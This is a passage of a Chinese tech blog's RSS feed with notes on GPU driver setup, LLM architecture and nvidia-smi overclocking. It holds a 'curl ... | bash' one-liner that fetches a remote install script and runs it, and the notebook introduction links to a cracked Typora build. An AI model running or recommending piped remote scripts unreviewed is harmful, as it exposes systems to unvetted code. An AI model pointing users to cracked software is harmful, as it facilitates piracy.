<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sSL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://www.geekery.cn/sh/LinuxCTS/os/apt/nvidia-docker.sh</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bash</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>脚本中一键部署了</p>
<ul>
<li>cuda工具</li>
<li>docker runtime</li>
<li>docker</li>
</ul>
<p>支持系统版本</p>
<p>| 操作系统    | 版本                | 备注                              |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>Radeon镜像站</title>
      <link>https://www.geekery.cn/free-service/radeon-mirror.html</link>
      <guid>https://www.geekery.cn/free-service/radeon-mirror.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Radeon镜像站</source>
      <description>Amd的Radeon镜像站 最近在使用 Ubuntu 安装Amd显卡驱动的时候访问国外镜像站网速特别慢，简直无法忍受，于是乎我自己做了个镜像站，用于加速驱动的下载。 下面的方法仅适用于Ubuntu，其他操作系统按照链接内容安装并替换镜像站 https://rocm.docs.amd.com/projects/install-on-linux/en/la...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>最近在使用 Ubuntu 安装Amd显卡驱动的时候访问国外镜像站网速特别慢，简直无法忍受，于是乎我自己做了个镜像站，用于加速驱动的下载。</p>
<p>下面的方法仅适用于Ubuntu，其他操作系统按照链接内容安装并替换镜像站   <s>我没用到，没写，谁用到了写一个</s> <a href="https://rocm.docs.amd.com/projects/install-on-linux/en/latest/install/amdgpu-install.html" target="_blank" rel="noopener noreferrer">https://rocm.docs.amd.com/projects/install-on-linux/en/latest/install/amdgpu-install.html</a></p>
<h2>镜像内容</h2>
<p>镜像的内容</p>
]]></content:encoded>
    </item>
    <item>
      <title>密码生成器</title>
      <link>https://www.geekery.cn/free-service/random-password.html</link>
      <guid>https://www.geekery.cn/free-service/random-password.html</guid>
      <source url="https://www.geekery.cn/rss.xml">密码生成器</source>
      <description>密码生成器 生成随机密码。 密码随机生成是一个用于生成随机密码的工具。它可以帮助用户创建强密码，以提高帐户的安全性。 源码开源在 GitHub 仓库 , 目前已经更新为vue版本。</description>
      <category>Tools</category>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>生成随机密码。</p>
<p>密码随机生成是一个用于生成随机密码的工具。它可以帮助用户创建强密码，以提高帐户的安全性。</p>
</blockquote>
<p>源码开源在 <a href="https://github.com/Paper-Dragon/GeneratePassword" target="_blank" rel="noopener noreferrer">GitHub 仓库</a> , 目前已经更新为vue版本。</p>
]]></content:encoded>
    </item>
    <item>
      <title>文本字符串倒序</title>
      <link>https://www.geekery.cn/free-service/text-reverse.html</link>
      <guid>https://www.geekery.cn/free-service/text-reverse.html</guid>
      <source url="https://www.geekery.cn/rss.xml">文本字符串倒序</source>
      <description>文本字符串倒序</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
]]></content:encoded>
    </item>
    <item>
      <title>笔记</title>
      <link>https://www.geekery.cn/note-book/</link>
      <guid>https://www.geekery.cn/note-book/</guid>
      <source url="https://www.geekery.cn/rss.xml">笔记</source>
      <description>运维开发绿皮书 什么是运维绿皮书 image-20220507163950057 作为一个技术宅，我经常编写各种文档和使用说明。由于很早就接触了博客系统，我一直习惯使用 Markdown 格式来编写文档。Markdown 的简洁和易读性让我能够高效地记录和分享技术知识。然而，随着经验的积累，我发现博客系统并不是最佳的解决方案。虽然许多博客平台提供了专栏...</description>
      <category>笔记</category>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>什么是运维绿皮书</h2>
<p></p>
<p>作为一个技术宅，我经常编写各种文档和使用说明。由于很早就接触了博客系统，我一直习惯使用 Markdown 格式来编写文档。Markdown 的简洁和易读性让我能够高效地记录和分享技术知识。然而，随着经验的积累，我发现博客系统并不是最佳的解决方案。虽然许多博客平台提供了专栏功能，而且像网易云笔记这样的编辑器也能通过 Markdown 管理文档，但这些工具往往带有过多的功能和界面元素，不够纯粹。</p>
<p>随着时间的推移，我积累的资料越来越多，这些文档也变得越来越杂乱无章。它们通常散落在电脑的各个角落，内容不系统化，管理起来也非常不便。这种情况下，我迫切需要一个工具来帮助我系统地组织和管理这些分散的 Markdown 文件。</p>
<p>经过一番研究和尝试，我最终选择了 <strong>Typora + GitHub</strong> 的组合。Typora 是一款非常优雅的 Markdown 编辑器，它提供了简洁的界面和丰富的功能，使得编写和预览 Markdown 文档变得非常方便。而 GitHub 则是一个强大的代码托管平台，通过 Git 版本控制，我可以轻松地管理和同步多个设备上的文档，确保数据的安全性和一致性。更重要的是，GitHub 的 Issues 和 Pull Requests 功能，使得社区成员可以方便地参与进来，共同完善和丰富这个知识库。</p>
<h3>选择这个方案的优势</h3>
<ul>
<li><strong>云存储</strong>：确保文档不会丢失，并且可以随时访问。</li>
<li><strong>本地修改</strong>：利用 Git 实现版本控制和分布式同步，随时可以回滚更改。</li>
<li><strong>自动生成</strong>：网站通过流水线脚本自动生成，简化维护流程。</li>
<li><strong>优雅输入</strong>：使用 Typora 等优雅的 Markdown 编辑器，提高写作体验。<s>最后一个免费的版本已经提供(<a href="https://gitee.com/PaperDragon/note-book/blob/master/tools/typora-0-11-18.exe" target="_blank" rel="noopener noreferrer">本仓库 tools 目录</a>)</s> ，新找到别人的 <a href="https://github.com/shuhongfan/TyporaCrack" target="_blank" rel="noopener noreferrer">v1.6.7 破解版</a>。</li>
</ul>
<h3>本文可能存在的缺陷与改进方向</h3>
<ul class="task-list-container">
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-0" disabled="disabled"><label class="task-list-item-label" for="task-item-0"> 文档完成度不到 50%</label>
<ul class="task-list-container">
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-1" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-1"> CSDN 的博文已搬迁完毕</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-2" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-2"> OneNote 的笔记已搬迁完毕</label></li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-3" disabled="disabled"><label class="task-list-item-label" for="task-item-3"> 预计逐步增加更多内容。</label></li>
</ul>
</li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-4" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-4"> 移动端适配问题</label>
<ul class="task-list-container">
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-5" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-5"> 发现并响应了移动端流量逐渐增加的趋势，之前页面对移动端不够友好。</label>
<ul class="task-list-container">
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-6" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-6"> 通过 <code>theme-hope</code> 插件修复了移动端适配问题，提升了用户体验。</label></li>
</ul>
</li>
</ul>
</li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-7" disabled="disabled"><label class="task-list-item-label" for="task-item-7"> 自动生成的潜在错误</label>
<ul class="task-list-container">
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-8" disabled="disabled"><label class="task-list-item-label" for="task-item-8"> 网站是通过 GitHub Actions 和脚本自动生成的，因此可能会出现小错误。定期检查生成流程，确保自动化过程稳定可靠。</label></li>
</ul>
</li>
<li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" id="task-item-9" checked="checked" disabled="disabled"><label class="task-list-item-label" for="task-item-9"> 欢迎大家通过反馈问题来帮助我们<a href="https://github.com/Paper-Dragon/notebook/issues" target="_blank" rel="noopener noreferrer">改进</a>。</label></li>
</ul>
<h2>致谢</h2>
<p>感谢每一位贡献者和使用者的支持，正是有了大家的共同努力，运维开发绿皮书才能不断成长和完善。如果你觉得本项目对你有所帮助，不妨给我们一个 🌟，这是对我们最大的鼓励！</p>
]]></content:encoded>
    </item>
    <item>
      <title>大语言模型</title>
      <link>https://www.geekery.cn/note-book/AI-Training/00%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/00%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B.html</guid>
      <source url="https://www.geekery.cn/rss.xml">大语言模型</source>
      <description>大语言模型</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
]]></content:encoded>
    </item>
    <item>
      <title>大模型技术基础</title>
      <link>https://www.geekery.cn/note-book/AI-Training/01%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E5%9F%BA%E7%A1%80.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/01%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B%E5%9F%BA%E7%A1%80.html</guid>
      <source url="https://www.geekery.cn/rss.xml">大模型技术基础</source>
      <description>大模型技术基础 大语言模型概念 定义： 通常指具有超大规模参数的预训练模型 架构：主要为transformer解码器架构 训练： 预训练（base model) 建立模型的基础能力 数据： 海量文本数据 优化：预测下一个词 后训练 (instruct model) 增强模型的任务能力 数据： 大量指令数据 优化： SFT、RL等方法 下游应用 测速（推...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>大语言模型概念</h2>
<p>定义： 通常指具有超大规模参数的预训练模型</p>
<p>架构：主要为transformer解码器架构</p>
<p>训练：</p>
<ul>
<li>预训练（base model)  建立模型的<strong>基础能力</strong>
<ul>
<li>数据： 海量文本数据</li>
<li>优化：预测下一个词</li>
</ul>
</li>
<li>后训练 (instruct model) 增强模型的<strong>任务能力</strong>
<ul>
<li>数据： 大量指令数据</li>
<li>优化： SFT、RL等方法</li>
</ul>
</li>
<li>下游应用
<ul>
<li>测速（推理）</li>
</ul>
</li>
</ul>
<h2>训练阶段对比</h2>
<p>| 对比方面 | 预训练 (Pre-training)                             | 后训练 (Post-training)                            |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>GPT&amp;DeepSeek模型</title>
      <link>https://www.geekery.cn/note-book/AI-Training/02GPT_DeepSeek%E6%A8%A1%E5%9E%8B.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/02GPT_DeepSeek%E6%A8%A1%E5%9E%8B.html</guid>
      <source url="https://www.geekery.cn/rss.xml">GPT&amp;DeepSeek模型</source>
      <description>GPT&amp;DeepSeek模型 GPT系列模型成体系推进 研究视野 技术人员 基础设施 工程实践 数据积累 算法设计 GPT系列模型从18年开始系统迭代，对于大模型发展起到了深远影响 GPT系列模型的技术演变 GPT系列模型发展历程 小模型：GPT-1、GPT-2 大模型：GPT-3、CodeX、GPT-3.5、GPT-4 推理大模型：o-series ...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>GPT系列模型成体系推进</h2>
<p>|年份|事件|
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>模型架构-Transformer模型</title>
      <link>https://www.geekery.cn/note-book/AI-Training/03%E6%A8%A1%E5%9E%8B%E6%9E%B6%E6%9E%84-Transformer%E6%A8%A1%E5%9E%8B.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/03%E6%A8%A1%E5%9E%8B%E6%9E%B6%E6%9E%84-Transformer%E6%A8%A1%E5%9E%8B.html</guid>
      <source url="https://www.geekery.cn/rss.xml">模型架构-Transformer模型</source>
      <description>模型架构-Transformer模型 Why Attention? 搜索场景 在搜索场景中，人们的目光往往会更加关注左上角的三角区域（即第一条搜索结果的位置) image-20250617180226663 阅读中 image-20250617180330064 浏览图文信息 image-20250617180404154 注意力机制 注意力机制，可以...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>Why Attention?</h2>
<h3>搜索场景</h3>
<p>在搜索场景中，人们的目光往往会更加关注左上角的三角区域（即第一条搜索结果的位置)</p>
<p></p>
<h3>阅读中</h3>
<p></p>
<h3>浏览图文信息</h3>
<p></p>
<h2>注意力机制</h2>
<p>注意力机制，可以视为一致基于相似度的查表</p>
<p></p>
<p>核心模块： 注意力</p>
<ul>
<li>Transformer完全抛弃传统的CNN和RNN，整个网络结构完全由注意力机制组成</li>
</ul>
<h2>编码器-解码器结构</h2>
<ul>
<li>编码器将输入序列变换为隐藏层特征</li>
<li>解码器将隐藏层特征变换为输出序列</li>
</ul>
<p></p>
<h3>编码器：将输入变换为隐藏层特征</h3>
<ul>
<li>N个堆叠的编码器层
<ul>
<li>多头注意力</li>
<li>前馈网络</li>
<li>残差连接和层归一化</li>
</ul>
</li>
</ul>
<p></p>
<h3>解码器：将隐藏层特征变换为自然语言序列</h3>
<ul>
<li>N个堆叠的解码器层
<ul>
<li>（掩码）多头注意力</li>
<li>前馈网络</li>
<li>残差链接和层归一化</li>
</ul>
</li>
</ul>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>模型详解配置</title>
      <link>https://www.geekery.cn/note-book/AI-Training/04%E6%A8%A1%E5%9E%8B%E8%AF%A6%E8%A7%A3%E9%85%8D%E7%BD%AE.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/04%E6%A8%A1%E5%9E%8B%E8%AF%A6%E8%A7%A3%E9%85%8D%E7%BD%AE.html</guid>
      <source url="https://www.geekery.cn/rss.xml">模型详解配置</source>
      <description>模型详解配置 构建大模型需要考虑的因素归一化方法、位置编码、激活函数、注意力计算 image-20250709173129303 层数L、注意力头数N、特征维度N 归一化方法 为什么要做归一化? 不同特征在空间中的尺度不同，对损失优化的影响不一致 特征尺度差异会导致损失函数各方向的梯度下降速度不同。尺度大的特征梯度更新剧烈，迫使模型花费更多迭代次数调整...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<p>构建大模型需要考虑的因素归一化方法、位置编码、激活函数、注意力计算</p>
<p></p>
<p>层数L、注意力头数N、特征维度N</p>
<h2>归一化方法</h2>
<h4>为什么要做归一化?</h4>
<ul>
<li>
<p><strong>不同特征在空间中的尺度不同，对损失优化的影响不一致</strong><br>
特征尺度差异会导致损失函数各方向的梯度下降速度不同。尺度大的特征梯度更新剧烈，迫使模型花费更多迭代次数调整其他特征权重，降低优化效率。</p>
</li>
<li>
<p><strong>提升训练稳定性，加速模型收敛</strong><br>
归一化使所有特征处于相近的数值范围（如[0,1]或[-1,1]）。这使优化路径更平滑，梯度更新方向更稳定，减少震荡风险，从而加快模型收敛速度。</p>
</li>
</ul>
<p></p>
<h3>方法</h3>
<p></p>
<h3>归一化模块位置</h3>
<p></p>
<h4>层后归一化(Post-Layer Normalization, Post-Norm)</h4>
<p><strong>定义</strong>  （归一化模块放置于残差计算之后）</p>
<p><strong>优点</strong></p>
<ul>
<li>加快训练收敛速度</li>
<li>防止梯度爆炸或梯度消失</li>
<li>降低神经网络对于超参数的敏感性</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>可能导致训练不稳定</li>
<li>目前较少单独使用</li>
</ul>
<h4>层前归一化(Pre-Layer Normalization, Pre-Norm)</h4>
<p><strong>定义</strong>  （归一化模块应用在每个子层之前）</p>
<p><strong>优点</strong></p>
<ul>
<li>训练更加稳定</li>
<li>主流模型采用较多</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li>性能略有逊色</li>
</ul>
<h4>夹心归一化(Sandwich-Norm)</h4>
<p><strong>定义</strong>  （通过双重归一化叠加：在子层<em>前</em>和子层<em>后</em>各加一次归一化）</p>
<p><strong>核心特性</strong></p>
<ul>
<li>Pre-Norm与Post-Norm的复合结构</li>
<li>归一化逻辑：输入 → <strong>首次归一化</strong> → Sublayer计算 → <strong>二次归一化</strong> → 残差连接</li>
</ul>
<p><strong>优势</strong></p>
<ul>
<li>理论上融合Pre-Norm的稳定性与Post-Norm的性能增益</li>
<li>梯度调节能力更强（双重归一化约束）</li>
</ul>
<p><strong>局限性</strong></p>
<ul>
<li>计算开销显著增加（额外归一化层）</li>
<li>仍存在训练震荡风险</li>
<li>实际应用较少，多见于理论研究</li>
</ul>
<h2>位置编码</h2>
<p></p>
<p>绝对位置编码代表性的是旋转位置编码</p>
<h3>绝对位置编码：旋转位置编码</h3>
<p></p>
<p></p>
<h3>相对位置编码：ALiBi位置编码</h3>
<p></p>
<h2>激活函数</h2>
<p><strong></strong></p>
<h2>注意力计算</h2>
<p></p>
<h3>对硬件优化</h3>
<p></p>
<h2>MOE模型</h2>
<p>举例： deepseek、Mixtral</p>
<p>目的是在不显著提升计算成本的同时实现对于模型参数的扩展。</p>
<p></p>
<h3>混合专家架构(Mixture-of-Experts, MoE)</h3>
<p><strong>核心定义</strong><br>
$$
\text{MoELayer}(x_t) = \sum_{i=1}^{K} G(x_t)_i \cdot E_i(x_t)<br>
$$
其中路由函数：<br>
$$
G(x_t) = \text{softmax}(\text{topk}(x_t \cdot W_G))<br>
$$</p>
<p><strong>基本组成</strong></p>
<ol>
<li>
<p><strong>专家组件</strong></p>
<ul>
<li>$K$个独立的前馈神经网络 ${E_1, E_2, ..., E_K}$</li>
<li>每个专家具备相同网络结构，参数不同</li>
</ul>
</li>
<li>
<p><strong>路由网络</strong></p>
<ul>
<li>$W_G$：权重矩阵（将输入词元$x_t$映射为$K$维得分向量）</li>
<li>$\text{topk}$：选择得分最高的$k$个专家（通常$k \ll K$）</li>
<li>$\text{softmax}$：归一化获得激活权重（未选中专家权重置$0$）</li>
</ul>
</li>
</ol>
<p><strong>运行流程</strong><br>
<code>输入词元 → 路由计算→ 筛选topk专家→ 专家并行计算→ 加权输出求和</code></p>
<p><strong>核心优势</strong></p>
<ul>
<li><strong>稀疏激活</strong>：仅计算部分专家输出（节省计算资源）</li>
<li><strong>超参扩容</strong>：通过增加专家数$K$提升模型容量（计算量仅由$k$决定）</li>
<li><strong>动态适配</strong>：根据输入特性自动分配处理专家</li>
</ul>
<p><strong>显著局限</strong></p>
<ul>
<li>路由决策不可导（需直通估计器技巧）</li>
<li>专家负载不均衡风险（需引入辅助损失）</li>
<li>通信开销大（分布式训练时专家间数据交换）</li>
</ul>
<h2>常用</h2>
<p>| 模型               | 混合专家    | 归一化      | 位置编码     | 激活函数 | 注意力机制     | 层数 | 隐藏层维度 | 注意力头个数 | 头维度 |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>训练相关资料</title>
      <link>https://www.geekery.cn/note-book/AI-Training/99%E8%AE%AD%E7%BB%83%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/99%E8%AE%AD%E7%BB%83%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99.html</guid>
      <source url="https://www.geekery.cn/rss.xml">训练相关资料</source>
      <description>训练相关资料 Mineru MinerU是一个将PDF转换为机器可读格式的工具（例如，markdown，JSON），允许轻松提取为任何格式。 https://github.com/opendatalab/MinerU/blob/master/README.md</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>Mineru</h2>
<p>MinerU是一个将PDF转换为机器可读格式的工具（例如，markdown，JSON），允许轻松提取为任何格式。</p>
<p>https://github.com/opendatalab/MinerU/blob/master/README.md</p>
]]></content:encoded>
    </item>
    <item>
      <title>Nvidia显卡在Ubuntu平台超频</title>
      <link>https://www.geekery.cn/note-book/AI-Training/Nvidia%E6%98%BE%E5%8D%A1%E5%9C%A8Ubuntu%E5%B9%B3%E5%8F%B0%E8%B6%85%E9%A2%91.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/Nvidia%E6%98%BE%E5%8D%A1%E5%9C%A8Ubuntu%E5%B9%B3%E5%8F%B0%E8%B6%85%E9%A2%91.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Nvidia显卡在Ubuntu平台超频</source>
      <description>Nvidia显卡在Ubuntu平台超频 nvidia-smi 借用网络上的一张图，这个命令结束后代表的含义 image-20240305095312766 对特殊参数进行解释 开启持久模式 设置目标 GPUs 的持久模式。有关持久性模式的描述，请参见 (GPU ATTRIBUTES) 部分。需要 root。除非使用 -i 参数指定单个 GPU，否则它将...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>nvidia-smi</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>借用网络上的一张图，这个命令结束后代表的含义</p>
<p></p>
<p>对特殊参数进行解释</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>持久模式：persistence mode 能够让 GPU 更快响应任务，待机功耗增加。</span></span>
<span class="line"><span>    关闭 persistence mode 同样能够启动任务。</span></span>
<span class="line"><span>    持续模式虽然耗能大，但是在新的GPU应用启动时，花费的时间更少</span></span>
<span class="line"><span>风扇转速：主动散热的显卡一般会有这个参数，服务器显卡一般是被动散热，这个参数显示N/A。</span></span>
<span class="line"><span>    从0到100%之间变动，这个速度是计算机期望的风扇转速，实际情况下如果风扇堵转，可能打不到显示的转速。</span></span>
<span class="line"><span>    有的设备不会返回转速，因为它不依赖风扇冷却而是通过其他外设保持低温（比如有些实验室的服务器是常年放在空调房间里的）。 </span></span>
<span class="line"><span>温度：单位是摄氏度。 </span></span>
<span class="line"><span>性能状态：从P0到P12，P0表示最大性能，P12表示状态最小性能。 </span></span>
<span class="line"><span>Disp.A：Display Active，表示GPU的显示是否初始化。 </span></span>
<span class="line"><span>ECC纠错：这个只有近几年的显卡才具有这个功能，老版显卡不具备这个功能。 </span></span>
<span class="line"><span>MIG：Multi-Instance GPU，多实例显卡技术，支持将一张显卡划分成多张显卡使用，目前只支持安培架构显卡。</span></span>
<span class="line"><span>新的多实例GPU (MIG)特性允许GPU(从NVIDIA安培架构开始)被安全地划分为多达7个独立的GPU实例。</span></span>
<span class="line"><span>用于CUDA应用，为多个用户提供独立的GPU资源，以实现最佳的GPU利用率。</span></span>
<span class="line"><span>对于GPU计算能力未完全饱和的工作负载，该特性尤其有益，因此用户可能希望并行运行不同的工作负载，以最大化利用率。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>开启持久模式</h2>
<p>设置目标 GPUs 的持久模式。有关持久性模式的描述，请参见 (GPU ATTRIBUTES) 部分。需要 root。除非使用 -i 参数指定单个 GPU，否则它将影响所有 GPU。此操作的效果是立竿见影的。但是，它不会在重新启动后持续存在。每次重新启动后，持久性模式将默认为 Disabled。仅在 Linux 上可用。</p>
<p>persistence mode 持续模式默认关闭。persistence mode 能够让 GPU 更快响应任务，待机功耗增加。关闭 persistence mode 同样能够启动任务。</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>nvidia-smi -pm 1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>Persistence-M 从 Off 变成 On，持续模式打开。</p>
<h2>设置功耗</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -pl</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [330功耗]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>锁核心频率</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -q</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CLOCK</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>【功能】查看当前的 GPU 时钟速度、默认时钟速度和最大可能的时钟速度</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -q</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SUPPORTED_CLOCKS</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>【功能】显示每个 GPU 的可用时钟速度列表</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -lgc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1035</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>将显卡核心频率锁定在1035MHz</p>
<h2>锁显存频率</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -lmc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> xxxx</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>将显存频率锁定到xxxx</p>
<p>使用nvidia-smi -rgc 即可恢复自动频率。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -rgc</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>显存和核心频率同时设置</h2>
